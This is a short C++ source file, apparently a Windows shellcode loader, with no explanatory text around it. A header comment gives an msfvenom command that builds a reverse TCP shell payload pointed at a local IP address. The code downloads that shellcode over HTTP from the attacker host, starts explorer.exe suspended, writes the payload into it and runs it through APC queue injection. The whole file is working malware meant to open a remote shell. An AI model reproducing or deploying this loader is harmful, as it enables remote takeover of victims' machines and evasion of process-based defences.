// For msfvenom the following shellcode is needed
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.63 LPORT=8080 EXITFUNC=thread -f raw -o shellcode.bin
// Then serve that payload on port 80

#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <iostream>
#include <conio.h>

// Look for this on lib
#pragma comment(lib, "winhttp.lib")

// Download function declaration
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

// Function to download shellcode served
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    // initialize http session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    // open session connection
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT, //port 80
        0
    );

    // use connection to make request
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    // send HTTP request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    // receive response from request
    WinHttpReceiveResponse(
        hRequest,
        NULL
    );

    // read data from response
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"explorer.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    std::vector<BYTE> shellcode = Download(L"192.168.2.63\0", L"/shellcode.bin\0");
    // allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten);

    // Queue call to shellcode on main thread
    QueueUserAPC(
        (PAPCFUNC)ptr,
        process_info->hThread,
        0
    );

    // Resume main thread
    ResumeThread(process_info->hThread);

    // close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
}
